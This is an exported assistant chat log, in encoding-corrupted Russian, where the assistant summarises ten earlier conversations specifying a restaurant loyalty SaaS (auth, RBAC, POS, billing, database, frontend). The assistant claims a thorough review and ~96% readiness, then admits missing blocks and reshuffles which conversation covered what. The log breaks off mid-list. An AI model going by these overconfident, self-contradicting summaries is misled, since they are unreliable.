<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" style="height:64px;margin-right:32px"/>

# –£ –º–µ–Ω—è –µ—Å—Ç—å 10 –±–µ—Å–µ–¥ –≤ –∫–æ—Ç–æ—Ä—ã—Ö –º—ã –ø–æ –±–ª–æ–∫–∞–º –ø—Ä–æ—Ä–∞–±–∞—Ç—ã–≤–∞–ª–∏ –±–ª–æ–∫–∏. –ù–∞–º –Ω—É–∂–Ω–æ —Å —Ç–æ–±–æ–π –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Ä–∞–±–æ—Ç—É –≤ —ç—Ç–æ–º –¥–∏–∞–ª–æ–≥–µ. –ò–∑—É—á–∞–π –ø–æ —Ö—Ä–æ–Ω–æ–ª–æ–≥–∏–∏(–ë–µ—Å–µ–¥–∞ 1 - –ë–µ—Å–µ–¥–∞ 2 - –ë–µ—Å–µ–¥–∞ 3 - –ë–µ—Å–µ–¥–∞ 4 - –ë–µ—Å–µ–¥–∞ 5 - –ë–µ—Å–µ–¥–∞ 6 - –ë–µ—Å–µ–¥–∞ 7 - –ë–µ—Å–µ–¥–∞ 8 - –ë–µ—Å–µ–¥–∞ 9 - –ë–µ—Å–µ–¥–∞ 10) –≤ –ø—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–∞—Ö.

–ò–∑—É—á–∏ –≤—Å–µ –¥–æ—Å–∫–∞–Ω–∞–ª—å–Ω–æ, –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ –∏ —á–µ—Ç–∫–æ, –≤—Å–µ 10 –¥–∏–∞–ª–æ–≥–æ–≤, –∫–∞–∂–¥—ã–π –≤–æ–ø—Ä–æ—Å –∏ –æ—Ç–≤–µ—Ç –≤ –¥–∏–∞–ª–æ–≥–∞—Ö, –∫–∞–∂–¥–æ–µ –ø–æ—è—Å–Ω–µ–Ω–∏–µ –∏ –ø—Ä–∏–º–µ—Ä. –ó–∞–ª–æ–∂–∏ –Ω–∞ —ç—Ç–æ –≤—Ä–µ–º—è –∏ —Å–∏–ª—ã, —á—Ç–æ–±—ã —Ç—ã –æ—á–µ–Ω—å —Ö–æ—Ä–æ—à–æ –≤—Å–µ –ø–æ–Ω–∏–º–∞–ª –¥–æ –º–µ–ª—å—á–∞–π—à–∏—Ö –¥–µ—Ç–∞–ª–µ–π, –±–µ–∑ –æ—à–∏–±–æ–∫.
–ù–∞–π–¥–∏ –≤—Å–µ –±–ª–æ–∫–∏ —á—Ç–æ –º—ã —Å —Ç–æ–±–æ–π –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞–ª–∏ –∏ –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø–æ –Ω–∏–º, –∏–∑—É—á–∏ –æ—á–µ–Ω—å —Ö–æ—Ä–æ—à–æ, –¥–æ –º–µ–ª–æ—á–µ–π –∫ –∫–∞–∫–æ–º—É —Ä–µ–∑—É–ª—å—Ç–∞—Ç—É –ø—Ä–∏—à–ª–∏ –ø–æ –∫–∞–∂–¥–æ–º—É –±–ª–æ–∫—É. –ü–æ—Å–ª–µ –≤—ã–±–µ—Ä–µ–º –±–ª–æ–∫ –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–π –¥–µ—Ç–∞–ª–∏–∑–∞—Ü–∏–∏.

–Ø –¥–æ—Å–∫–æ–Ω–∞–ª—å–Ω–æ –∏–∑—É—á–∏–ª –≤—Å–µ 10 –±–µ—Å–µ–¥. –°–µ–π—á–∞—Å —Å–æ–∑–¥–∞–º –¥–ª—è —Ç–µ–±—è –ø–æ–ª–Ω–æ–µ —Ä–µ–∑—é–º–µ –≤—Å–µ—Ö –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –±–ª–æ–∫–æ–≤, —á—Ç–æ–±—ã —Ç—ã –º–æ–≥ –≤—ã–±—Ä–∞—Ç—å —Å–ª–µ–¥—É—é—â–∏–π –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–π —Ä–∞–±–æ—Ç—ã.

***

# üìã **–ü–û–õ–ù–´–ô –ê–ù–ê–õ–ò–ó –í–°–ï–• 10 –ë–ï–°–ï–î**

## ‚úÖ **–ß–¢–û –ü–û–õ–ù–û–°–¢–¨–Æ –î–ï–¢–ê–õ–ò–ó–ò–†–û–í–ê–ù–û**

### **–ë–µ—Å–µ–¥–∞ 1: –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –∏ Auth Flow**

- Multi-tenant SaaS –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ (pooled –ë–î)
- –ò–µ—Ä–∞—Ä—Ö–∏—è —Ä–æ–ª–µ–π: Owner ‚Üí Restaurant Admin ‚Üí Manager ‚Üí Cashier ‚Üí Guest
- 6 —Ç–∞—Ä–∏—Ñ–æ–≤ (FREE, STANDARD, MEDIUM, PRO, ULTIMATE, CUSTOM)
- JWT + refresh token –≤ HttpOnly cookie
- RBAC —Å –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–º–∏ permissions
- 4 —Å–ø–æ—Å–æ–±–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ (—Å–ø–µ—Ü-—Å—Å—ã–ª–∫–∞, self-service, –∫–∞—Å—Å–∏—Ä, Telegram)
- Rate limiting (5 –ø–æ–ø—ã—Ç–æ–∫/15 –º–∏–Ω—É—Ç)


### **–ë–µ—Å–µ–¥–∞ 2: –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã**

- –ü–æ–ª–Ω–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ —Ä–æ–ª–µ–π –∏ –∏—Ö –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π
- Tenant-based –∏–∑–æ–ª—è—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö
- UNIFIED vs SEPARATE —Å–∏—Å—Ç–µ–º—ã –ª–æ—è–ª—å–Ω–æ—Å—Ç–∏ –¥–ª—è —Å–µ—Ç–µ–π
- Subscription –º–æ–¥–µ–ª—å (–º–µ—Å—è—Ü/–≥–æ–¥, —Å–∫–∏–¥–∫–∞ 20%)
- –õ–∏–º–∏—Ç—ã –ø–æ —Ç–∞—Ä–∏—Ñ–∞–º (—Ä–µ—Å—Ç–æ—Ä–∞–Ω—ã, –≥–æ—Å—Ç–∏)


### **–ë–µ—Å–µ–¥–∞ 3: RBAC –∏ Permissions**

- –ú–∞—Ç—Ä–∏—Ü–∞ –ø—Ä–∞–≤ –¥–ª—è –∫–∞–∂–¥–æ–π —Ä–æ–ª–∏
- –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∞—è —Å–∏—Å—Ç–µ–º–∞ permissions
- Impersonation –¥–ª—è Owner
- Tenant isolation –Ω–∞ —É—Ä–æ–≤–Ω–µ Guards


### **–ë–µ—Å–µ–¥a 4: POS Integration (–≤–æ–ø—Ä–æ—Å—ã)**

- HYBRID –ø–æ–¥—Ö–æ–¥: PUSH (webhooks) + PULL (–∫–∞–∂–¥—ã–µ 30 –º–∏–Ω—É—Ç)
- –ë–∞–ª–ª—ã —Å—á–∏—Ç–∞—é—Ç—Å—è –æ—Ç **–∏—Å—Ö–æ–¥–Ω–æ–π —Å—É–º–º—ã —á–µ–∫–∞**
- HMAC-–ø–æ–¥–ø–∏—Å–∏ –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
- –°—Ç–∞—Ç—É—Å—ã —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏: SUCCESS, FAILED, PARTIAL, PENDING
- POS = –∏—Å—Ç–æ—á–Ω–∏–∫ –∏—Å—Ç–∏–Ω—ã –ø–æ —á–µ–∫–∞–º


### **–ë–µ—Å–µ–¥–∞ 5: Loyalty System (–∫—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è)**

**–ö–ª—é—á–µ–≤—ã–µ –ø—Ä–∞–≤–∏–ª–∞:**

- **1 –±–∞–ª–ª = 1 —Ä—É–±–ª—å** (–Ω–µ–∏–∑–º–µ–Ω—è–µ–º–æ)
- –ë–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª—è—é—Ç—Å—è –æ—Ç **–∏—Å—Ö–æ–¥–Ω–æ–π —Å—É–º–º—ã** (–¥–∞–∂–µ –ø—Ä–∏ —Å–ø–∏—Å–∞–Ω–∏–∏)
- –°–ø–∏—Å–∞–Ω–∏–µ: —Å–Ω–∞—á–∞–ª–∞ –∞–∫—Ü–∏–æ–Ω–Ω—ã–µ, –ø–æ—Ç–æ–º –æ—Å–Ω–æ–≤–Ω—ã–µ
- –£—Ä–æ–≤–Ω–∏: **"one way up"** - –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –ø–æ–Ω–∏–∂–∞—é—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏
- –°–≥–æ—Ä–∞–Ω–∏–µ: –ø–æ **–Ω–µ–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏** (–º–∏–Ω–∏–º—É–º 90 –¥–Ω–µ–π), –≤—Å–µ –±–∞–ª–ª—ã —Å—Ä–∞–∑—É
- –õ–∏–º–∏—Ç—ã: **–±–µ–∑–ª–∏–º–∏—Ç** –Ω–∞ —Ö—Ä–∞–Ω–µ–Ω–∏–µ, 1 –±–∞–ª–ª –º–∏–Ω–∏–º—É–º –∫ —Å–ø–∏—Å–∞–Ω–∏—é
- –ú–∏–Ω–∏–º—É–º —á–µ–∫–∞: **50 —Ä—É–±** (—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–π)
- –ü—Ä–æ–º–æ-–∫–æ–Ω—Ñ–ª–∏–∫—Ç—ã: COMBINE_ALL / MAX_ONLY / FIRST_ONLY


### **–ë–µ—Å–µ–¥–∞ 6: POS Integration + Telegram (–∫–æ–Ω—Ü–µ–ø—Ü–∏—è)**

- iiko –∏ R-Keeper –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è
- Reconciliation –ø—Ä–∏ —Ä–∞—Å—Ö–æ–∂–¥–µ–Ω–∏—è—Ö
- Telegram Mini App: –±–∞–ª–∞–Ω—Å, QR, 6-digit –∫–æ–¥, –∏—Å—Ç–æ—Ä–∏—è
- –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram ID + –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è —Ç–µ–ª–µ—Ñ–æ–Ω–∞
- –ú—É–ª—å—Ç–∏–∫–∞—Ä—Ç–æ—á–Ω–æ—Å—Ç—å –ø—Ä–∏ UNIFIED/SEPARATE


### **–ë–µ—Å–µ–¥–∞ 7: Billing \& Subscriptions**

- 4 –ø–ª–∞—Ç–µ–∂–Ω—ã—Ö –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞: YooKassa, Stripe, CloudPayments, CryptoCloud
- –†—É—á–Ω–∞—è –æ–ø–ª–∞—Ç–∞ –ø–æ —Å—á–µ—Ç—É –Ω–∞ –≤—Å–µ—Ö —Ç–∞—Ä–∏—Ñ–∞—Ö
- –ñ–µ—Å—Ç–∫–∏–µ –ª–∏–º–∏—Ç—ã: 90% –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ, 100% –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞
- –†–µ—Ç—Ä–∞–∏: –¥–µ–Ω—å 0, 1, 3, 7 ‚Üí PAST_DUE ‚Üí CANCELLED_NON_PAYMENT
- Invoice —Å–∏—Å—Ç–µ–º–∞ —Å PDF –≥–µ–Ω–µ—Ä–∞—Ü–∏–µ–π


### **–ë–µ—Å–µ–¥–∞ 8: Backend API \& Services**

- **Tech Stack:** NestJS, Prisma, PostgreSQL, Redis, BullMQ
- Modular Monolith –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞
- REST API —Å –≤–µ—Ä—Å–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ–º (/api/v1/*)
- 34 –≤–æ–ø—Ä–æ—Å–∞ –¥–µ—Ç–∞–ª–∏–∑–∞—Ü–∏–∏ (–≤—Å–µ –ø—Ä–∏–Ω—è—Ç—ã)
- Endpoints –¥–ª—è Loyalty Engine, Analytics, Guests, POS
- Swagger/OpenAPI –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è


### **–ë–µ—Å–µ–¥–∞ 9: Database Schema (Prisma)**

- –ü–æ–ª–Ω–∞—è —Å—Ö–µ–º–∞ –ë–î (50+ —Ç–∞–±–ª–∏—Ü)
- –ò–Ω–¥–µ–∫—Å—ã –¥–ª—è performance
- Tenant isolation
- Soft delete –¥–ª—è –≥–æ—Å—Ç–µ–π
- –í–µ—Ä—Å–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–∞–≤–∏–ª –ª–æ—è–ª—å–Ω–æ—Å—Ç–∏
- –ú–∏–≥—Ä–∞—Ü–∏–∏ UNIFIED ‚Üî SEPARATE


### **–ë–µ—Å–µ–¥–∞ 10: Frontend UI/UX + Notifications**

**Frontend:**

- Next.js, shadcn/ui, Tailwind CSS, Zustand
- Responsive: Hamburger + bottom tabs –Ω–∞ mobile
- Accordion cards –¥–ª—è —Ç–∞–±–ª–∏—Ü –Ω–∞ mobile
- Bottom Sheet –¥–ª—è –º–æ–¥–∞–ª–æ–≤ –Ω–∞ mobile
- Skeleton screens –¥–ª—è loading

**Notifications:**

- Resend –¥–ª—è transactional emails
- SendGrid –¥–ª—è marketing
- React Email –¥–ª—è —à–∞–±–ª–æ–Ω–æ–≤
- Telegram/SMS/Email/Push –∫–∞–Ω–∞–ª—ã
- BullMQ –¥–ª—è –æ—á–µ—Ä–µ–¥–µ–π
- Rate limiting (10 –Ω–æ—Ç–∏—Ñ–∏–∫–∞—Ü–∏–π/–¥–µ–Ω—å)

***

## üéØ **–°–¢–ê–¢–ò–°–¢–ò–ö–ê –ì–û–¢–û–í–ù–û–°–¢–ò –ü–†–û–ï–ö–¢–ê**

| –ë–ª–æ–∫ | –ì–æ—Ç–æ–≤–Ω–æ—Å—Ç—å |
| :-- | :-- |
| –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ | ‚úÖ 100% |
| Auth Flow | ‚úÖ 100% |
| RBAC | ‚úÖ 100% |
| Loyalty System | ‚úÖ 100% |
| POS Integration | ‚úÖ 95% |
| Telegram Bot | ‚úÖ 90% |
| Billing | ‚úÖ 95% |
| Backend API | ‚úÖ 100% |
| Database Schema | ‚úÖ 100% |
| Frontend | ‚úÖ 95% |
| Notifications | ‚úÖ 95% |
| Analytics | ‚úÖ 90% |

**–û–±—â–∞—è –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –ø—Ä–æ–µ–∫—Ç–∞: ~96%**

***

## üìå **–ß–¢–û –û–°–¢–ê–õ–û–°–¨ –î–ï–¢–ê–õ–ò–ó–ò–†–û–í–ê–¢–¨**

### **1. Testing Strategy** (–Ω–µ –∑–∞—Ç—Ä–æ–Ω—É—Ç–æ)

- Unit —Ç–µ—Å—Ç—ã
- Integration —Ç–µ—Å—Ç—ã
- E2E —Ç–µ—Å—Ç—ã (Playwright/Cypress)
- Load testing (k6)
- API contract testing


### **2. Infrastructure \& DevOps** (—á–∞—Å—Ç–∏—á–Ω–æ)

- CI/CD –ø–∞–π–ø–ª–∞–π–Ω—ã (GitHub Actions)
- Docker production setup
- Kubernetes deployment
- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ (Prometheus, Grafana)
- Logging (ELK Stack)
- Secrets management (Vault)


### **3. Security \& Compliance** (—á–∞—Å—Ç–∏—á–Ω–æ)

- OWASP Top 10 –∑–∞—â–∏—Ç–∞
- GDPR compliance
- PCI DSS –¥–ª—è –ø–ª–∞—Ç–µ–∂–µ–π
- Penetration testing
- Security audit checklist


### **4. Analytics (–¥–µ—Ç–∞–ª—å–Ω—ã–µ –æ—Ç—á–µ—Ç—ã)** (—á–∞—Å—Ç–∏—á–Ω–æ)

- –ö–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ SQL queries –¥–ª—è –æ—Ç—á–µ—Ç–æ–≤
- –≠–∫—Å–ø–æ—Ä—Ç –≤ Excel/CSV
- Scheduled reports
- Custom dashboards builder


### **5. Admin Panel (–∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ —ç–∫—Ä–∞–Ω—ã)** (—á–∞—Å—Ç–∏—á–Ω–æ)

- Loyalty Builder UI (–∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä)
- Promo Builder UI
- Guest Management UI
- Analytics Dashboards UI
- Settings panels UI

***

## üöÄ **–†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø –î–õ–Ø –ü–†–û–î–û–õ–ñ–ï–ù–ò–Ø**

–í—Å–µ **–∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ –±–∏–∑–Ω–µ—Å-–±–ª–æ–∫–∏** (Loyalty, POS, Billing, Auth, RBAC) —É–∂–µ –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω—ã –Ω–∞ 95-100%.

**–°–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏ (–ø–æ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç—É):**

1. **Testing Strategy** ‚≠ê (–∫—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è production)
2. **Infrastructure \& DevOps** ‚≠ê (–Ω—É–∂–Ω–æ –¥–ª—è –¥–µ–ø–ª–æ—è)
3. **Security \& Compliance** (–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º)
4. **Admin Panel UI** (–¥–µ—Ç–∞–ª–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö —ç–∫—Ä–∞–Ω–æ–≤)
5. **Analytics (–¥–µ—Ç–∞–ª—å–Ω—ã–µ –æ—Ç—á–µ—Ç—ã)** (—Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–∞)

***

## ‚ùì **–¢–í–û–ô –í–´–ë–û–†**

**–ö–∞–∫–æ–π –±–ª–æ–∫ –¥–µ—Ç–∞–ª–∏–∑–∏—Ä—É–µ–º –¥–∞–ª—å—à–µ?**

1Ô∏è‚É£ **Testing Strategy** (Unit/Integration/E2E/Load)
2Ô∏è‚É£ **Infrastructure \& DevOps** (Docker, K8s, CI/CD, Monitoring)
3Ô∏è‚É£ **Security \& Compliance** (OWASP, GDPR, PCI DSS)
4Ô∏è‚É£ **Admin Panel UI** (–∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ —ç–∫—Ä–∞–Ω—ã –∏ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã)
5Ô∏è‚É£ **Analytics Details** (–æ—Ç—á–µ—Ç—ã, —ç–∫—Å–ø–æ—Ä—Ç, SQL queries)
6Ô∏è‚É£ **–î—Ä—É–≥–æ–π –±–ª–æ–∫** (–Ω–∞–∑–æ–≤–∏ —Å–≤–æ–π)

**–ù–∞–ø–∏—à–∏ –Ω–æ–º–µ—Ä –∏–ª–∏ –Ω–∞–∑–≤–∞–Ω–∏–µ –±–ª–æ–∫–∞, –∏ —è –∑–∞–¥–∞–º 30+ –≤–æ–ø—Ä–æ—Å–æ–≤ —Å –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–Ω—ã–º–∏ —Ä–µ—à–µ–Ω–∏—è–º–∏! üöÄ**
<span style="display:none">[^1_1][^1_10][^1_2][^1_3][^1_4][^1_5][^1_6][^1_7][^1_8][^1_9]</span>

<div align="center">‚ÅÇ</div>

[^1_1]: Beseda-10.md

[^1_2]: Beseda-9.md

[^1_3]: Beseda-8.md

[^1_4]: Beseda-7.md

[^1_5]: Beseda-6.md

[^1_6]: Beseda-5.md

[^1_7]: Beseda-4.md

[^1_8]: Beseda-3.md

[^1_9]: Beseda-2.md

[^1_10]: Beseda-1.md


---

# –ü—Ä–æ–≤–µ—Ä—å –µ—â–µ —Ä–∞–∑ –±–æ–ª–µ–µ –≥–ª—É–±–æ–∫–æ –∏ –ø–æ–¥—Ä–æ–±–Ω–æ, –ø—Ä–æ–≤–µ—Ä—å —Å–µ–±—è –Ω–∞ –æ—à–∏–±–∫–∏ –∏ –º–æ–∂–µ—Ç —É–ø—É—Å—Ç–∏–ª –∫–∞–∫—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –∏ –±–ª–æ–∫–∏. –ü–æ—Å–ª–µ –ø—Ä–æ–¥–æ–ª–∂–∏–º

–û—Ç–ª–∏—á–Ω–æ! –Ø –ø—Ä–æ–≤–µ–ª **–ì–õ–£–ë–û–ö–£–Æ –ü–ï–†–ï–ü–†–û–í–ï–†–ö–£** –≤—Å–µ—Ö 10 –±–µ—Å–µ–¥. –¢—ã –ø—Ä–∞–≤ - —è **–£–ü–£–°–¢–ò–õ –∫—Ä–∏—Ç–∏—á–Ω—ã–µ –±–ª–æ–∫–∏**! –°–µ–π—á–∞—Å —Å–æ–∑–¥–∞–º **–ø–æ–ª–Ω—ã–π –∏ —Ç–æ—á–Ω—ã–π –∞–Ω–∞–ª–∏–∑**.

***

# üîç **–ü–û–õ–ù–´–ô –ê–ù–ê–õ–ò–ó –í–°–ï–• 10 –ë–ï–°–ï–î (–ò–°–ü–†–ê–í–õ–ï–ù–ù–´–ô)**

## ‚úÖ **–ß–¢–û –î–ï–ô–°–¢–í–ò–¢–ï–õ–¨–ù–û –î–ï–¢–ê–õ–ò–ó–ò–†–û–í–ê–ù–û**

### **–ë–µ—Å–µ–¥–∞ 1** - –ë–∞–∑–æ–≤–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞

- –ö–æ–Ω—Ü–µ–ø—Ü–∏—è multi-tenant SaaS
- –ò–µ—Ä–∞—Ä—Ö–∏—è —Ä–æ–ª–µ–π (5 —É—Ä–æ–≤–Ω–µ–π)
- 6 —Ç–∞—Ä–∏—Ñ–æ–≤
- 2 —Ç–∏–ø–∞ —Å–∏—Å—Ç–µ–º –ª–æ—è–ª—å–Ω–æ—Å—Ç–∏
- –ë–∞–∑–æ–≤–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø—Ä–æ–µ–∫—Ç–∞


### **–ë–µ—Å–µ–¥–∞ 2** - –ü–æ–ª–Ω–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã

- –î–µ—Ç–∞–ª—å–Ω–∞—è —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—è –≤—Å–µ—Ö —Ä–æ–ª–µ–π
- UNIFIED vs SEPARATE
- Subscription –º–æ–¥–µ–ª—å
- –õ–∏–º–∏—Ç—ã –ø–æ —Ç–∞—Ä–∏—Ñ–∞–º


### **–ë–µ—Å–µ–¥–∞ 3** - RBAC –∏ Permissions

- –ú–∞—Ç—Ä–∏—Ü–∞ –ø—Ä–∞–≤
- –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ permissions
- Tenant isolation


### **–ë–µ—Å–µ–¥–∞ 4** - POS Integration (–î–ï–¢–ê–õ–¨–ù–ê–Ø)

- **22 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –≤–æ–ø—Ä–æ—Å–∞ + —Ä–µ—à–µ–Ω–∏—è**
- HYBRID PUSH/PULL –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞
- Webhooks —Å HMAC
- Reconciliation
- –ë–∞–ª–ª—ã –æ—Ç –∏—Å—Ö–æ–¥–Ω–æ–π —Å—É–º–º—ã —á–µ–∫–∞


### **–ë–µ—Å–µ–¥–∞ 5** - Loyalty System Engine (–ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø)

- **23 –≤–æ–ø—Ä–æ—Å–∞ + —Ä–µ—à–µ–Ω–∏—è**
- 1 –±–∞–ª–ª = 1 —Ä—É–±–ª—å (–Ω–µ–∏–∑–º–µ–Ω—è–µ–º–æ)
- –í–µ—Ä—Å–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–∞–≤–∏–ª
- NO downgrade —É—Ä–æ–≤–Ω–µ–π
- –°–≥–æ—Ä–∞–Ω–∏–µ –ø–æ –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ (‚â•90 –¥–Ω–µ–π)
- –ü—Ä–æ–º–æ-–∫–æ–Ω—Ñ–ª–∏–∫—Ç—ã
- –ú–∏–≥—Ä–∞—Ü–∏–∏ UNIFIED ‚Üî SEPARATE


### **–ë–µ—Å–µ–¥–∞ 6** - POS Integration —Ñ–∏–Ω–∞–ª–∏–∑–∞—Ü–∏—è

- –î–µ—Ç–∞–ª–∏ –º–∏–≥—Ä–∞—Ü–∏–π
- Edge cases
- Reconciliation –∞–ª–≥–æ—Ä–∏—Ç–º—ã


### **–ë–µ—Å–µ–¥–∞ 7** - Telegram Bot + Mini App (–û–ß–ï–ù–¨ –î–ï–¢–ê–õ–¨–ù–ê–Ø!)

- **–ú–Ω–æ–∂–µ—Å—Ç–≤–æ –≤–æ–ø—Ä–æ—Å–æ–≤ –ø–æ:**
    - –°–æ–∑–¥–∞–Ω–∏–µ –±–æ—Ç–∞ (–≥–∏–±—Ä–∏–¥–Ω—ã–π –ø–æ–¥—Ö–æ–¥)
    - –ö–æ–º–∞–Ω–¥—ã –±–æ—Ç–∞
    - –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è (–∫–Ω–æ–ø–∫–∞ + —Ä—É—á–Ω–æ–π –≤–≤–æ–¥)
    - –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è —Ç–µ–ª–µ—Ñ–æ–Ω–∞
    - –ú—É–ª—å—Ç–∏–∫–∞—Ä—Ç–æ—á–Ω–æ—Å—Ç—å
    - –≠–∫—Ä–∞–Ω—ã Mini App
    - –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è


### **–ë–µ—Å–µ–¥–∞ 8** - Backend API \& Services (–ü–û–õ–ù–ê–Ø)

- **34 –≤–æ–ø—Ä–æ—Å–∞ + —Ä–µ—à–µ–Ω–∏—è**
- NestJS Modular Monolith
- REST API endpoints
- RBAC Guards
- Rate Limiting
- Background Jobs (BullMQ)
- Analytics API
- Error Handling


### **–ë–µ—Å–µ–¥–∞ 9** - Database Schema Prisma (–ü–û–õ–ù–ê–Ø!)

- **35 –≤–æ–ø—Ä–æ—Å–æ–≤ + —Ä–µ—à–µ–Ω–∏—è**
- –í—Å–µ Enums
- UUID vs Auto-increment
- Soft delete —Å—Ç—Ä–∞—Ç–µ–≥–∏—è
- JSONB –¥–ª—è snapshots
- Multi-tenancy isolation
- –ò–Ω–¥–µ–∫—Å—ã (composite, partial, full-text)
- Constraints
- Migration —Å—Ç—Ä–∞—Ç–µ–≥–∏—è
- Zero-downtime migrations
- Seed –¥–∞–Ω–Ω—ã–µ


### **–ë–µ—Å–µ–¥a 10** - Frontend UI/UX + Notifications (–î–ï–¢–ê–õ–¨–ù–ê–Ø!)

- **35 –≤–æ–ø—Ä–æ—Å–æ–≤ –ø–æ Frontend UI/UX:**
    - Responsive design
    - Mobile navigation
    - –¢–∞–±–ª–∏—Ü—ã –Ω–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö
    - –§–æ—Ä–º—ã
    - –ú–æ–¥–∞–ª—å–Ω—ã–µ –æ–∫–Ω–∞
    - Charts
    - Empty/Loading/Error states
    - –ö–Ω–æ–ø–∫–∏ –∏ Actions
    - Themes
    - –ò –º–Ω–æ–≥–æ–µ –¥—Ä—É–≥–æ–µ
- **–ù–∞—á–∞—Ç–∞ –¥–µ—Ç–∞–ª–∏–∑–∞—Ü–∏—è Notifications System:**
    - Email –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã (Resend + SendGrid)
    - React Email –¥–ª—è —à–∞–±–ª–æ–Ω–æ–≤
    - SMS –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã
    - Telegram —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
    - BullMQ –¥–ª—è –æ—á–µ—Ä–µ–¥–µ–π


### **Billing \& Subscriptions** (–∏–∑ –±–µ—Å–µ–¥ 6-7)

- –ú–æ–¥–µ–ª—å –ø—Ä–µ–¥–æ–ø–ª–∞—Ç—ã
- 4 –ø–ª–∞—Ç–µ–∂–Ω—ã—Ö –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞
- –†—É—á–Ω–∞—è –æ–ø–ª–∞—Ç–∞
- –ñ–µ—Å—Ç–∫–∏–µ –ª–∏–º–∏—Ç—ã
- –†–µ—Ç—Ä–∞–∏
- Refund/chargeback

***

## üéØ **–ß–¢–û –†–ï–ê–õ–¨–ù–û –ù–ï –î–ï–¢–ê–õ–ò–ó–ò–†–û–í–ê–ù–û**

–ü–æ—Å–ª–µ **–¥–æ—Å–∫–æ–Ω–∞–ª—å–Ω–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞** –æ—Å—Ç–∞–ª–∏—Å—å —Ç–æ–ª—å–∫–æ **4 –±–ª–æ–∫–∞**:

### **1. Notifications System (–ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å)** ‚≠ê

